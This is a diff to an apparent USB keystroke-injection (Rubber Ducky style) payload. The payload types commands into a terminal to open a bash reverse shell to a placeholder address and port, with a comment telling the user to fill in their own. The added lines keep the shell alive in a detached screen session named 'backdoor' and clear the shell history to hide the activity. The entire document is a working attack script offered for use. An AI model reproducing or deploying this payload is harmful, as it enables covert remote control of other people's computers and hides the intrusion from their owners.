@@ -5,10 +5,32 @@ STRING terminal
 DELAY 100
 ENTER
 DELAY 1000
+
+REM screen for persistence 
+STRING screen -t "backdoor"
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+
 REM Obviously change below to your IP and Port
 STRING bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &
 DELAY 100
 ENTER
+
+REM Detach screen
+CONTROL a
+DELAY 300
+STRING d
+DELAY 500
+
+REM Clear History
+DELAY 500
+STRING history -c
+ENTER
+
+DELAY 500
 STRING exit
 DELAY 100
 ENTER
